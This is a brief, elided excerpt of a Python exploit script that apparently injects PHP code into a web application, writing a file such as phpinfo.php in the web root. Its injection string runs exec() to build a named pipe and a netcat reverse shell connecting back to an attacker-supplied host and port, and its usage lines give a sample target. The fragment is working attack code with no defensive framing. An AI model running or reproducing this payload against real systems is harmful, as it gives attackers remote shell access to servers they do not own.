...
def main(argv):
    if len(sys.argv) == 6:
        ...
        print("[*] Usage: " + sys.argv[0] + " <used_class> <out_file> <revhost> <revport> <url>")
        print("[*] Example: " + sys.argv[0] + " Info /var/www/html/phpinfo.php 192.168.10.23 7000 http://192.168.10.2/index.php\n")
        exit(0)
    ...
    try:
        ...
        injection = "<?php exec('/bin/sh -c \"mknod /tmp/backpipe p && /bin/sh 0</tmp/backpipe | nc " + revhost + " " + revport + " 1>/tmp/backpipe\"'); ?>"
